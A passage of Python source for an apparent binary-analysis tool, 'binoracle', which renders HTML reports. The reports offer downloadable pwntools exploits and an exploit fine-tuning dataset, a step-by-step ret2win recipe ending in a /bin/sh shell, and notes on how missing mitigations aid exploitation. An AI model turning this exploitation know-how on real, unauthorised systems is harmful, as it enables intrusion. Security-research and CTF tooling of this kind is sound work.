        msg = (("No se pudo derivar un esquema de explotacion: describe la vulnerabilidad de la CVE "
                "(p.ej. 'stack buffer overflow') y carga un binario para concretar offset/gadgets.")
               if es else
               ("Could not derive an exploitation schema: describe the CVE vulnerability (e.g. 'stack "
                "buffer overflow') and load a binary to concretize offset/gadgets."))
        note = getattr(plan, "note", "") if plan is not None else ""
        extra = f"<p class='mut' style='font-size:12px'>{_esc(note)}</p>" if note else ""
        intro = (f"<div class='md'>{_md_rich(intro_md)}</div>") if intro_md else ""
        return head + intro + f"<p class='mut'>{_esc(msg)}</p>{extra}</main></body></html>"
    section = _cveplan_html(plan, lang)
    # el titulo data-i18n se rellena en servidor (vista sin el JS del informe)
    title = ((_I18N.get(lang, _I18N["es"]).get("exploit_plan", "Exploitation schema")))
    section = section.replace('data-i18n="exploit_plan" id="sec-exploitplan"></h2>',
                              f'data-i18n="exploit_plan" id="sec-exploitplan">{_esc(title)}</h2>')
    # boton de descarga del exploit desarrollado (data URI del script pwntools)
    dl = ""
    if getattr(plan, "script", ""):
        b64 = base64.b64encode(plan.script.encode("utf-8")).decode("ascii")
        fname = f"exploit_{os.path.splitext(name)[0]}.py"
        label = ("Descargar exploit (pwntools)" if es else "Download exploit (pwntools)")
        dl = (f'<p><a class="dlbtn" download="{fname}" '
              f'href="data:text/x-python;base64,{b64}">&#8681; {label}</a></p>')
    banner = (("Apartado CVE -> exploit funcional: a partir de la informacion de la vulnerabilidad, "
               "binoracle deriva el esquema y desarrolla el exploit mas funcional posible, verificado "
               "en sandbox cuando la cadena se puede ejecutar. Solo objetivos autorizados / CTF." )
              if es else
              ("CVE -> functional exploit: from the vulnerability information, binoracle derives the "
               "schema and develops the most functional exploit possible, sandbox-verified when the "
               "chain is executable. Authorized targets / CTF only."))
    hdr = (f'<h2 style="margin-top:0">{"CVE &rarr; exploit funcional" if es else "CVE &rarr; functional exploit"}'
           f' <span class="mut" style="font-size:13px">({name})</span></h2>'
           f'<p class="sechelp">{_esc(banner)}</p>')
    intro = (f"<div class='md' style='margin:6px 0 14px'>{_md_rich(intro_md)}</div>") if intro_md else ""
    return head + hdr + intro + dl + section + "</main></body></html>"


def render_training_page(markdown: str, lang: str = "es") -> str:
    """Pagina autocontenida con el informe del agente entrenador (markdown -> HTML enriquecido)."""
    head = (f"<!doctype html><html lang='{lang}'><head><meta charset='utf-8'>"
            f"<meta name='viewport' content='width=device-width, initial-scale=1'>"
            f"<style>{_CSS}</style></head><body><main class='md' style='padding:16px'>")
    return head + _md_rich(markdown or "") + "</main></body></html>"


def render_investigation_page(markdown: str, script: str = "", cve: str = "target",
                              lang: str = "es") -> str:
    """Pagina del agente de investigacion: informe (markdown) + descarga del exploit desarrollado."""
    import base64
    import re as _re
    es = lang == "es"
    head = (f"<!doctype html><html lang='{lang}'><head><meta charset='utf-8'>"
            f"<meta name='viewport' content='width=device-width, initial-scale=1'>"
            f"<style>{_CSS}</style></head><body><main class='md' style='padding:16px'>")
    dl = ""
    if script:
        b64 = base64.b64encode(script.encode("utf-8")).decode("ascii")
        safe = _re.sub(r"[^A-Za-z0-9_.-]", "_", cve or "target")
        label = ("Descargar exploit (pwntools)" if es else "Download exploit (pwntools)")
        dl = (f'<p><a class="dlbtn" download="exploit_{safe}.py" '
              f'href="data:text/x-python;base64,{b64}">&#8681; {label}</a></p>')
    return head + dl + _md_rich(markdown or "") + "</main></body></html>"


def render_dataset_page(markdown: str, jsonl_text: str = "", fname: str = "exploit_sft.jsonl",
                        lang: str = "es") -> str:
    """Pagina del generador de dataset SFT: resumen + boton de descarga del JSONL (data URI)."""
    import base64
    es = lang == "es"
    head = (f"<!doctype html><html lang='{lang}'><head><meta charset='utf-8'>"
            f"<meta name='viewport' content='width=device-width, initial-scale=1'>"
            f"<style>{_CSS}</style></head><body><main class='md' style='padding:16px'>")
    dl = ""
    if jsonl_text:
        b64 = base64.b64encode(jsonl_text.encode("utf-8")).decode("ascii")
        label = ("Descargar dataset (.jsonl)" if es else "Download dataset (.jsonl)")
        dl = (f'<p><a class="dlbtn" download="{_esc(fname)}" '
              f'href="data:application/jsonl;base64,{b64}">&#8681; {label}</a></p>')
    return head + _md_rich(markdown or "") + dl + "</main></body></html>"


def render_html(binary: str, triage=None, findings: Optional[List[Finding]] = None,
                ledger=None, answer: str = "", lang: str = "es", embed: bool = False,
                decompiled=None, cfg=None, chains=None) -> str:
    findings = findings or []
    ts = datetime.now().isoformat(timespec="seconds")
    mit = _parse_mitigations(triage)
    # Las mitigaciones ELF (NX/PIE/RELRO) no existen en Windows: mostrarlas para un PE es
    # enganoso (RELRO sale "N/A", PIE se confunde con ASLR aunque el mecanismo real -- y el bit
    # que lo activa, DllCharacteristics -- es distinto). Para bintype=pe se sustituyen por las
    # mitigaciones reales de Windows: ASLR/DEP/CFG (DllCharacteristics, ver _pe_dll_characteristics)
    # y Authenticode (firma digital, ya presente en la salida de 'iI' como 'signed').
    is_pe = mit.get("bintype") == "pe"
    if is_pe:
        mit.update(_pe_dll_characteristics(binary))
        mit["Authenticode"] = mit.get("signed")
    # Texto por defecto renderizado en servidor: el informe es legible aunque NO corra JS (al
    # abrirlo como fichero estatico). El JS luego solo cambia el idioma con el boton.
    def L(k):
        return _esc(_I18N.get(lang, _I18N["es"]).get(k, k))

    counts = {s: 0 for s in _SEV}
    verified = 0
    for f in findings:
        counts[f.severity] = counts.get(f.severity, 0) + 1
        if f.verdict == "verified":
            verified += 1
    total = len(findings)

    # severity distribution bar
    seg = ""
    for s in _SEV:
        if counts.get(s):
            pct = counts[s] / total * 100 if total else 0
            seg += f'<span style="width:{pct:.1f}%;background:{_SEV_COLOR[s]}" title="{s}: {counts[s]}"></span>'
    empty_seg = '<span style="width:100%;background:var(--line)"></span>'
    dist = '<div class="dist">' + (seg or empty_seg) + '</div>'

    # KPI cards
    def kpi(labkey, val, color="var(--fg)"):
        return (f'<div class="kpi"><div class="kpi-v" style="color:{color}">{val}</div>'
                f'<div class="kpi-l" data-i18n="{labkey}">{L(labkey)}</div></div>')
    kpis = (
        kpi("kpi_total", total) +
        kpi("kpi_verified", verified, _VERDICT_COLOR["verified"]) +
        kpi("kpi_high", counts["critical"] + counts["high"], _SEV_COLOR["high"]) +
        kpi("kpi_sources", len(ledger.sources()) if ledger else 0)
    )

    # mitigation panel: good/bad coloring (NX on = good, PIE on = good, Canary on = good)
    _MIT_BOOL_GOOD = ("NX", "PIE", "Canary", "ASLR", "DEP", "CFG", "Authenticode")
    def mit_item(key, value):
        if value is None:
            state, cls = "?", "mut"
        elif key in _MIT_BOOL_GOOD:
            good = bool(value) if isinstance(value, bool) else False
            state = ("ON" if good else "OFF") if isinstance(value, bool) else str(value)
            cls = "ok" if good else "bad"
        elif key == "RELRO":
            state = str(value).upper()
            cls = "ok" if value == "full" else ("warn" if value == "partial" else "bad")
        else:
            state, cls = str(value), "mut"
        return f'<div class="mit {cls}"><span class="mit-k">{_esc(key)}</span><span class="mit-v">{_esc(state)}</span></div>'
    mit_keys = ("Arch", "ASLR", "DEP", "CFG", "Canary", "Authenticode") if is_pe \
        else ("Arch", "NX", "PIE", "Canary", "RELRO")
    mit_panel = "".join(mit_item(k, mit.get(k)) for k in mit_keys)

    # findings cards
    cards = ""
    def _bi(es, en):
        """Bloque de texto bilingue: se renderizan ES y EN; el CSS muestra el activo segun el
        idioma del <html> (el boton de idioma lo cambia). Asi el toggle ES/EN afecta tambien a
        la EXPLICACION, no solo a las etiquetas, y funciona sin JS extra."""
        en = en or es
        return (f'<div class="md"><div class="lg lg-es">{_md(es)}</div>'
                f'<div class="lg lg-en">{_md(en)}</div></div>')
    for f in sorted(findings, key=lambda x: _SEV.index(x.severity) if x.severity in _SEV else 9):
        cvbadge, cvbody = _cvss_html(f, lang)
        # <details> nativo: cada hallazgo se DESPLIEGA al pulsar, tambien como fichero estatico.
        cards += f'''
        <details class="card" data-sev="{_esc(f.severity)}">
          <summary class="card-h">
            {_badge(f.severity.upper(), _SEV_COLOR.get(f.severity,'#666'))}
            {_badge(f.verdict, _VERDICT_COLOR.get(f.verdict,'#666'))}
            {cvbadge}
            <span class="title">{_esc(f.title)}</span>
            <span class="loc">{_esc(f.location)}</span>
            <span class="chev">&#9656;</span>
          </summary>
          <div class="card-b">
            <h4 data-i18n="rationale">{L("rationale")}</h4>{_bi(f.rationale, getattr(f, "rationale_en", ""))}
            <h4 data-i18n="evidence">{L("evidence")}</h4>{_evidence_html(f.evidence)}
            {cvbody}
            <h4 data-i18n="recommendation">{L("recommendation")}</h4>{_bi(f.recommendation, getattr(f, "recommendation_en", ""))}
          </div>
        </details>'''

    triage_sections = ""
    if triage is not None:
        for title, source, text in triage.sections:
            help_txt = _surface_help(f"{title} {source}", lang)
            help_html = f'<p class="sechelp">{_esc(help_txt)}</p>' if help_txt else ""
            triage_sections += (f'<details class="sec"><summary>{_esc(title)}'
                                f'<span class="src">{_esc(source)}</span></summary>'
                                f'{help_html}<pre>{_esc(text)}</pre></details>')

    trail = ""
    if ledger is not None and getattr(ledger, "entries", None):
        # Renumera secuencial (1..N): el contador interno del bucle salta (pasos internos/
        # dedup + backstop en res.steps+N); en el informe se lee limpio y sin huecos.
        for i, e in enumerate(ledger.entries, 1):
            kind_lbl, kind_col = _trail_kind(e.tool, e.source, e.data, lang)
            chip = f'<span class="evkind" style="background:{kind_col}">{_esc(kind_lbl)}</span>'
            trail += (f'<details class="sec"><summary>paso {i}: {_esc(e.tool)} {chip}'
                      f'<span class="src">{_esc(e.source)}</span></summary>'
                      f'<pre><span class="cmd">$ {_esc(e.tool)}</span>\n{_esc(e.data)}</pre></details>')

    # Prueba de explotacion: captura destacada del PoC verificado en sandbox (la evidencia clave
    # de un informe profesional). Reune los hallazgos VERIFICADOS con su ejecucion y los pasos
    # del ledger que son una corrida de exploit en sandbox.
    proof_blocks = []
    for f in findings:
        if f.verdict == "verified" and (f.evidence or "").strip():
            proof_blocks.append((f.title, f.location, f.evidence))
    if ledger is not None and getattr(ledger, "entries", None):
        for e in ledger.entries:
            blob = f"{e.tool} {e.source} {e.data}".lower()
            if any(k in blob for k in ("sandbox", "verificado", "verified", "shell", "flag{",
                                       "try_ret2win", "autopoc", "autorop", "try_rop")):
                proof_blocks.append((e.tool, e.source, e.data))
    proof_html = ""
    if proof_blocks:
        seen = set(); cards_p = ""
        for title, loc, data in proof_blocks:
            key = (title, (data or "")[:80])
            if key in seen:
                continue
            seen.add(key)
            cards_p += (f'<div class="proof"><div class="proof-h"><span class="proof-ok">&#10003;</span>'
                        f'<span class="proof-t">{_esc(title)}</span>'
                        f'<span class="proof-l">{_esc(loc)}</span></div>'
                        f'<pre class="evpre">{_esc(data)}</pre></div>')
        proof_html = (f'<h2 data-i18n="poc_proof" id="sec-proof"></h2>'
                      f'<p class="poc-note" data-i18n="poc_note"></p>{cards_p}')

    decompiled_html = _decompiled_html(decompiled, lang)
    cfg_html = _cfg_html(cfg, lang)
    exploit_graph_html = _exploit_html(chains, lang)
    # Esquema de explotacion (de la vulnerabilidad al exploit): reutiliza el analisis de cadenas ya
    # calculado (sin re-ejecutar el sandbox) para concretar offset/gadgets/objetivo y, si hay cadena
    # verificada, adjuntar la prueba y el script pwntools reproducible.
    cveplan_html = ""
    try:
        from ..workflows.cveplan import plan_from_analysis
        _facts = {"nx": mit.get("NX"), "pie": mit.get("PIE"),
                  "canary": mit.get("Canary"), "relro": mit.get("RELRO")}
        _pl = plan_from_analysis(chains, _facts, binary_name=binary, lang=lang)
        cveplan_html = _cveplan_html(_pl, lang)
    except Exception:
        cveplan_html = ""
    exploit_html = _exploit_section(binary, findings, lang)
    mit_detail_html = _mit_detail(mit, lang)
    capability_html = _capability_html(_pe_capability_map(triage, binary), lang) if is_pe else ""
    attack_chain_html = _attack_chain(findings, mit, lang)
    references_html = _references(findings, lang)
    owasp_html = _owasp_html(findings, lang)
    # Resumen ejecutivo COHERENTE (deterministico) en vez de la narracion del modelo, que puede
    # contradecirse ("no encontre vuln" + backstop verificado). Profesional y sin la nota de citas.
    summary_txt = _auto_summary(binary, findings, mit, lang)
    answer_html = (f'<div class="panel md summary" id="sec-summary">'
                   f'<div class="panel-t" data-i18n="exec_summary"></div>{_md(summary_txt)}</div>')
    packing_html = _packing_warning_html(_pe_packing_check(binary), lang) if is_pe else ""
    dll_hijack_html = _dll_hijack_html(_pe_dll_hijack_check(triage), lang) if is_pe else ""
    pdb_leak_html = _pdb_leak_html(_pe_pdb_leak(binary), lang) if is_pe else ""
    # Indice: solo las secciones realmente presentes.
    _has = {"summary": True, "proof": bool(proof_html), "exploit": bool(exploit_html),
            "dec": bool(decompiled_html), "cfg": bool(cfg_html), "find": True,
            "owasp": bool(owasp_html), "exploitplan": bool(cveplan_html),
            "mit": bool(mit_detail_html), "chain": bool(attack_chain_html),
            "xchain": bool(exploit_graph_html), "surface": bool(triage_sections),
            "refs": bool(references_html), "trail": bool(trail)}
    toc_html = _toc(lang, _has)
    sev_buttons = "".join(
        f'<button class="fbtn" data-f="{s}" onclick="flt(this)"><i style="background:{_SEV_COLOR[s]}"></i>'
        f'<span data-i18n="sev_{s}">{L("sev_"+s)}</span> <b>{counts.get(s,0)}</b></button>' for s in _SEV)

    i18n = _json.dumps(_I18N)

    header_html = "" if embed else f'''<header>
  <div class="brand"><span class="dot"></span> binoracle <em data-i18n="subtitle"></em></div>
  <div class="hmeta"><code>{_esc(binary)}</code> &middot; {ts}</div>
  <div class="controls">
    <button id="lang" class="ctl" onclick="toggleLang()">EN</button>
    <button id="theme" class="ctl" onclick="toggleTheme()">&#9788;</button>
  </div>
</header>'''
    html = f'''<!doctype html>
<html lang="{lang}"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>binoracle - {_esc(binary)}</title>
<style>{_CSS}</style></head>
<body>
{header_html}
<main>
  <section class="dash">
    <div class="kpis">{kpis}</div>
    <div class="panel">
      <div class="panel-t" data-i18n="severity_dist"></div>
      {dist}
      <div class="panel-t" style="margin-top:14px" data-i18n="mitigations"></div>
      <div class="mits">{mit_panel}</div>
    </div>
  </section>

  {toc_html}

  {packing_html}

  {dll_hijack_html}

  {pdb_leak_html}

  {answer_html}

  {proof_html}

  {exploit_html}

  {decompiled_html}

  {cfg_html}

  <h2 data-i18n="findings" id="sec-find"></h2>
  <div class="toolbar">
    <input id="q" placeholder="" oninput="search()">
    {sev_buttons}
  </div>
  <div id="cards">{cards or '<p class="empty" data-i18n="no_findings"></p>'}</div>

  {owasp_html}

  {mit_detail_html}

  {capability_html}

  {attack_chain_html}

  {exploit_graph_html}

  {cveplan_html}

  <h2 data-i18n="attack_surface" id="sec-surface"></h2>
  {triage_sections or '<p class="empty" data-i18n="no_triage"></p>'}

  {references_html}

  <h2 data-i18n="evidence_trail" id="sec-trail"></h2>
  {trail or '<p class="empty" data-i18n="no_trail"></p>'}

  <footer data-i18n="footer"></footer>
</main>
<script>
const I18N = {i18n};
let lang = localStorage.getItem('bo_lang') || '{lang}';
function applyI18n(){{
  document.querySelectorAll('[data-i18n]').forEach(el=>{{
    const k = el.dataset.i18n; const t = (I18N[lang]||{{}})[k];
    if(t!==undefined) el.textContent = t;
  }});
  document.getElementById('q').placeholder = (I18N[lang]||{{}}).search || '';
  document.getElementById('lang').textContent = lang==='es'?'EN':'ES';
  document.documentElement.lang = lang;
}}
function toggleLang(){{ lang = lang==='es'?'en':'es'; localStorage.setItem('bo_lang',lang); applyI18n(); }}
function setTheme(t){{ document.documentElement.setAttribute('data-theme',t); localStorage.setItem('bo_theme',t);
  document.getElementById('theme').innerHTML = t==='dark'?'&#9788;':'&#9789;'; }}
function toggleTheme(){{ setTheme(document.documentElement.getAttribute('data-theme')==='dark'?'light':'dark'); }}
const off = new Set();
function flt(b){{const f=b.dataset.f; if(off.has(f)){{off.delete(f);b.classList.remove('boff')}}else{{off.add(f);b.classList.add('boff')}} apply();}}
function apply(){{document.querySelectorAll('.card').forEach(c=>{{c.style.display=off.has(c.dataset.sev)?'none':''}});search();}}
function search(){{const q=(document.getElementById('q').value||'').toLowerCase();
  document.querySelectorAll('.card').forEach(c=>{{if(off.has(c.dataset.sev))return;
    c.style.display=c.textContent.toLowerCase().includes(q)?'':'none';}});}}
(function init(){{
  const saved = localStorage.getItem('bo_theme');
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
  setTheme(saved || (prefersDark?'dark':'light'));
  applyI18n();
}})();
</script>
</body></html>'''
    # Rellena en servidor cualquier etiqueta data-i18n que quedara vacia, para que el informe
    # sea legible como fichero estatico sin JS (los KPIs/titulos no salen como numeros sueltos).
    html = re.sub(r'(data-i18n="([a-z0-9_]+)"[^>]*>)(</)',
                  lambda m: m.group(1) + L(m.group(2)) + m.group(3), html)
    return html


_I18N = {
    "es": {
        "subtitle": "informe de reversing y explotacion",
        "kpi_total": "hallazgos", "kpi_verified": "verificados",
        "kpi_high": "severidad alta", "kpi_sources": "fuentes consultadas",
        "severity_dist": "Distribucion por severidad", "mitigations": "Mitigaciones",
        "exec_summary": "Resumen ejecutivo",
        "poc_proof": "Prueba de explotacion (PoC)",
        "poc_note": "Captura de la ejecucion real en sandbox aislado que DEMUESTRA el exploit "
                    "(shell / flag / objetivo alcanzado). Evidencia reproducible, no teorica.",
        "decompiled": "Decompilacion anotada (funcion vulnerable)",
        "cfg_graph": "Grafo de flujo interactivo",
        "attack_chain": "Cadena de explotacion",
        "exploit_chains": "Analizador de cadenas de explotacion",
        "exploit_plan": "Esquema de explotacion (vulnerabilidad -> exploit)",
        "exploit_steps": "Exploit paso a paso",
        "mit_detail": "Mitigaciones y remediacion",
        "references": "Referencias",
        "findings": "Hallazgos", "attack_surface": "Superficie de ataque",
        "evidence_trail": "Rastro de evidencia (grounding)",
        "rationale": "Razonamiento", "evidence": "Evidencia", "recommendation": "Recomendacion",
        "search": "buscar hallazgos...",
        "sev_critical": "critico", "sev_high": "alto", "sev_medium": "medio",
        "sev_low": "bajo", "sev_info": "info",
        "no_findings": "Sin hallazgos respaldados por evidencia.",
        "no_triage": "Sin triage capturado.", "no_trail": "No se consulto ningun oracle.",
        "footer": "Generado por binoracle. Cada afirmacion esta atribuida al oracle que la produjo.",
    },
    "en": {
        "subtitle": "reverse engineering & exploitation report",
        "kpi_total": "findings", "kpi_verified": "verified",
        "kpi_high": "high severity", "kpi_sources": "sources consulted",
        "severity_dist": "Severity distribution", "mitigations": "Mitigations",
        "exec_summary": "Executive summary",
        "poc_proof": "Exploitation proof (PoC)",
        "poc_note": "Capture of the real execution in an isolated sandbox that PROVES the exploit "
                    "(shell / flag / goal reached). Reproducible evidence, not theoretical.",
        "decompiled": "Annotated decompilation (vulnerable function)",
        "cfg_graph": "Interactive control-flow graph",
        "attack_chain": "Exploitation chain",
        "exploit_chains": "Exploit chain analyzer",
        "exploit_plan": "Exploitation schema (vulnerability -> exploit)",
        "exploit_steps": "Exploit step by step",
        "mit_detail": "Mitigations and remediation",
        "references": "References",
        "findings": "Findings", "attack_surface": "Attack surface",
        "evidence_trail": "Evidence trail (grounding)",
        "rationale": "Rationale", "evidence": "Evidence", "recommendation": "Recommendation",
        "search": "search findings...",
        "sev_critical": "critical", "sev_high": "high", "sev_medium": "medium",
        "sev_low": "low", "sev_info": "info",
        "no_findings": "No evidence-backed findings.",
        "no_triage": "No triage captured.", "no_trail": "No oracle tools were consulted.",
        "footer": "Generated by binoracle. Every fact is attributed to the oracle that produced it.",
    },
}

def _mst(v):  # estado legible de una mitigacion booleana/str
    if v is None:
        return "?"
    if isinstance(v, bool):
        return "ON" if v else "OFF"
    return str(v).upper()


_EXP_STR = {
    "es": {
        "repro": "Reproduccion paso a paso", "script": "Exploit (pwntools)",
        "remote": "en remoto", "local": "en local",
        "offc": "bytes hasta la direccion de retorno guardada",
        "align": "Si crashea por alineacion de pila (movaps), inserta un gadget 'ret' antes:",
        "steps": lambda off, win: [
            "<b>checksec</b>: NX activo (no shellcode en pila), sin canary (overflow directo pisa "
            "RIP), sin PIE (direcciones fijas). Conclusion: ret2win viable.",
            f"<b>Localizar la gift</b>: funcion <code>win()</code> en <code>{win}</code> que ejecuta "
            "<code>system(\"/bin/sh\")</code>.",
            f"<b>Hallar el offset</b> hasta la direccion de retorno guardada: <code>{off}</code> "
            "(tamano del buffer + rbp guardado). Verificado por ejecucion en sandbox.",
            f"<b>Construir el payload</b>: <code>{off}</code> bytes de relleno + la direccion de "
            "<code>win()</code>.",
            "<b>Ejecutar en sandbox aislado</b> (Docker, sin red): se obtiene shell (uid=0). "
            "Ver la captura en 'Prueba de explotacion' arriba.",
        ],
    },
    "en": {
        "repro": "Step-by-step reproduction", "script": "Exploit (pwntools)",
        "remote": "remote", "local": "local",
        "offc": "bytes to the saved return address",
        "align": "If it crashes on stack alignment (movaps), insert a 'ret' gadget first:",
        "steps": lambda off, win: [
            "<b>checksec</b>: NX on (no stack shellcode), no canary (overflow overwrites RIP "
            "directly), no PIE (fixed addresses). So: ret2win is viable.",
            f"<b>Locate the gift</b>: <code>win()</code> at <code>{win}</code> running "
            "<code>system(\"/bin/sh\")</code>.",
            f"<b>Find the offset</b> to the saved return address: <code>{off}</code> (buffer size + "
            "saved rbp). Verified by sandbox execution.",
            f"<b>Build the payload</b>: <code>{off}</code> filler bytes + the address of "
            "<code>win()</code>.",
            "<b>Run in an isolated sandbox</b> (Docker, no network): a shell is obtained (uid=0). "
            "See the capture under 'Exploitation proof' above.",
        ],
    },
}


def _mrow_es(state, impact, rem, cls):
    return {"state": state, "impact": impact, "rem": rem, "cls": cls}


_MIT_STR = {
    "es": {
        "h_mit": "Mitigacion", "h_state": "Estado", "h_impact": "Implicacion para explotacion",
        "h_rem": "Remediacion",
        "NX": lambda v: _mrow_es(_mst(v),
            "Sin shellcode en pila/heap; hay que reutilizar codigo (ROP/ret2libc)." if v not in (False,)
            else "Pila/heap ejecutables: puedes saltar a shellcode inyectado.",
            "Mantener NX (-z noexecstack)." if v not in (False,) else "Activar NX: enlazar con -z noexecstack.",
            "ok" if v not in (False,) else "bad"),
        "PIE": lambda v: _mrow_es(_mst(v),
            "Codigo en direccion fija: hardcodea PLT/GOT/gadgets sin leak." if v in (False,)
            else "Codigo reubicado: necesitas un leak para saltar mitigaciones.",
            "Compilar con -pie -fPIE (y ASLR del SO)." if v in (False,) else "Mantener PIE.",
            "bad" if v in (False,) else "ok"),
        "Canary": lambda v: _mrow_es(_mst(v),
            "El overflow lineal pisa la direccion de retorno directamente." if v in (False,)
            else "Hay que filtrar o forzar el canary antes de pisar RIP.",
            "Compilar con -fstack-protector-strong." if v in (False,) else "Mantener el canary.",
            "bad" if v in (False,) else "ok"),
        "RELRO": lambda v: _mrow_es(_mst(v),
            "GOT escribible: GOT overwrite / ret2dlresolve posibles." if str(v).lower() != "full"
            else "GOT de solo lectura: sin GOT overwrite (ve por FSOP/exit-handlers).",
            "Enlazar con -Wl,-z,relro,-z,now (Full RELRO)." if str(v).lower() != "full" else "Mantener Full RELRO.",
            "warn" if str(v).lower() == "partial" else ("bad" if str(v).lower() in ("none", "no") else "ok")),
        "ASLR": lambda v: _mrow_es(_mst(v),
            "Base fija (imagen + DLLs cargan siempre en la misma direccion): hardcodea gadgets/API sin leak."
            if v in (False,) else "Base reubicada en cada arranque: necesitas un leak (p.ej. una direccion filtrada) para calcularla.",
            "Enlazar con /DYNAMICBASE (bit DllCharacteristics IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)."
            if v in (False,) else "Mantener /DYNAMICBASE.",
            "bad" if v in (False,) else "ok"),
        "DEP": lambda v: _mrow_es(_mst(v),
            "Pila/heap ejecutables: puedes saltar a shellcode inyectado (sin reutilizar codigo)."
            if v in (False,) else "Sin shellcode en pila/heap; hay que reutilizar codigo (ROP).",
            "Enlazar con /NXCOMPAT (bit DllCharacteristics IMAGE_DLLCHARACTERISTICS_NX_COMPAT)."
            if v in (False,) else "Mantener /NXCOMPAT.",
            "bad" if v in (False,) else "ok"),
        "CFG": lambda v: _mrow_es(_mst(v),
            "Sin validacion de destinos: un `call`/`jmp` indirecto secuestrado (vtable, puntero a funcion) "
            "puede saltar a CUALQUIER direccion ejecutable." if v in (False,) else
            "Cada `call`/`jmp` indirecto se valida contra una bitmap de destinos validos en tiempo de carga: "
            "un vptr/puntero a funcion secuestrado solo puede saltar a un destino ya autorizado por el compilador.",
            "Compilar/enlazar con /guard:cf (bit DllCharacteristics IMAGE_DLLCHARACTERISTICS_GUARD_CF)."
            if v in (False,) else "Mantener /guard:cf.",
            "bad" if v in (False,) else "ok"),
        "Authenticode": lambda v: _mrow_es(_mst(v),
            "El binario no esta firmado: nada impide modificarlo (parchear, inyectar) sin que Windows/SmartScreen "
            "lo detecte, y no hay forma de verificar el editor." if v in (False,) else
            "Firmado: Windows puede verificar editor e integridad antes de ejecutar (SmartScreen/AppLocker/WDAC).",
            "Firmar con signtool (certificado de editor de codigo valido)." if v in (False,) else
            "Mantener la firma valida y el certificado vigente.",
            "bad" if v in (False,) else "ok"),
    },
    "en": {
        "h_mit": "Mitigation", "h_state": "State", "h_impact": "Exploitation implication",
        "h_rem": "Remediation",
        "NX": lambda v: _mrow_es(_mst(v),
            "No stack/heap shellcode; must reuse code (ROP/ret2libc)." if v not in (False,)
            else "Executable stack/heap: you can jump to injected shellcode.",
            "Keep NX (-z noexecstack)." if v not in (False,) else "Enable NX: link with -z noexecstack.",
            "ok" if v not in (False,) else "bad"),
        "PIE": lambda v: _mrow_es(_mst(v),
            "Code at a fixed address: hardcode PLT/GOT/gadgets, no leak needed." if v in (False,)
            else "Relocated code: you need a leak.",
            "Compile with -pie -fPIE (and OS ASLR)." if v in (False,) else "Keep PIE.",
            "bad" if v in (False,) else "ok"),
        "Canary": lambda v: _mrow_es(_mst(v),
            "A linear overflow overwrites the return address directly." if v in (False,)
            else "You must leak or brute-force the canary first.",
            "Compile with -fstack-protector-strong." if v in (False,) else "Keep the canary.",
            "bad" if v in (False,) else "ok"),
        "RELRO": lambda v: _mrow_es(_mst(v),
            "Writable GOT: GOT overwrite / ret2dlresolve possible." if str(v).lower() != "full"
            else "Read-only GOT: no GOT overwrite (use FSOP/exit-handlers).",
            "Link with -Wl,-z,relro,-z,now (Full RELRO)." if str(v).lower() != "full" else "Keep Full RELRO.",
            "warn" if str(v).lower() == "partial" else ("bad" if str(v).lower() in ("none", "no") else "ok")),
        "ASLR": lambda v: _mrow_es(_mst(v),
            "Fixed base (image + DLLs always load at the same address): hardcode gadgets/API addresses, no leak needed."
            if v in (False,) else "Base relocated on every start: you need a leak (e.g. a disclosed address) to compute it.",
            "Link with /DYNAMICBASE (DllCharacteristics bit IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)."
            if v in (False,) else "Keep /DYNAMICBASE.",
            "bad" if v in (False,) else "ok"),
        "DEP": lambda v: _mrow_es(_mst(v),
            "Executable stack/heap: you can jump to injected shellcode (no code reuse needed)."
            if v in (False,) else "No stack/heap shellcode; must reuse code (ROP).",
            "Link with /NXCOMPAT (DllCharacteristics bit IMAGE_DLLCHARACTERISTICS_NX_COMPAT)."
            if v in (False,) else "Keep /NXCOMPAT.",
            "bad" if v in (False,) else "ok"),
        "CFG": lambda v: _mrow_es(_mst(v),
            "No target validation: a hijacked indirect `call`/`jmp` (vtable, function pointer) can jump to ANY "
            "executable address." if v in (False,) else
            "Every indirect `call`/`jmp` is checked against a bitmap of valid targets at load time: a hijacked "
            "vptr/function pointer can only land where the compiler already authorized.",
            "Compile/link with /guard:cf (DllCharacteristics bit IMAGE_DLLCHARACTERISTICS_GUARD_CF)."
            if v in (False,) else "Keep /guard:cf.",
            "bad" if v in (False,) else "ok"),
        "Authenticode": lambda v: _mrow_es(_mst(v),
            "The binary is unsigned: nothing stops it being modified (patched, injected) without Windows/"
            "SmartScreen flagging it, and there is no way to verify the publisher." if v in (False,) else
            "Signed: Windows can verify the publisher and integrity before running it (SmartScreen/AppLocker/WDAC).",
            "Sign it with signtool (a valid code-signing certificate)." if v in (False,) else
            "Keep the signature valid and the certificate current.",
            "bad" if v in (False,) else "ok"),
    },
}

_REF_STR = {
    "es": {"note": "Cheat sheets del RAG local relevantes a lo detectado (consultables con el "
                   "comando de abajo) y fuentes autoritativas.", "ext": "Fuentes autoritativas"},
    "en": {"note": "Local RAG cheat sheets relevant to what was found (query with the command "
                   "below) and authoritative sources.", "ext": "Authoritative sources"},
}


_CFG_JS = r"""
(function(){
  var W = __CFGW__;
  var INFO = __CFGINFO__;
  var svg = document.getElementById('cfgsvg'), vp = document.getElementById('cfgvp');
  var panel = document.getElementById('cfginfo');
  if(!svg || !vp) return;
  function esc(s){ return (s+'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
  function showInfo(id){
    var d = INFO[id]; if(!d || !panel) return;
    var ins = d.insns.map(function(x){ return '<div class="cfgi-l">'+esc(x)+'</div>'; }).join('');
    panel.innerHTML = '<div class="cfgi-a">'+esc(d.addr)+'</div><div class="cfgi-code">'+ins+'</div>'+
      (d.state?'<div class="cfgi-note" style="border-color:#12a594"><b>estado:</b> '+esc(d.state)+'</div>':'')+
      '<div class="cfgi-note">'+esc(d.note||'')+'</div>';
    vp.querySelectorAll('.cfgnode').forEach(function(g){ g.classList.toggle('sel', g.getAttribute('data-id')===id); });
  }
  function tf(g){ var m=/translate\(([-\d.]+),\s*([-\d.]+)\)/.exec(g.getAttribute('transform')||''); return m?{x:+m[1],y:+m[2]}:{x:0,y:0}; }
  function nh(g){ var r=g.querySelector('rect'); return r?+r.getAttribute('height'):40; }
  var tx=0, ty=0, scale=1;
  (function(){ var p=tf(vp); tx=p.x; ty=p.y; })();
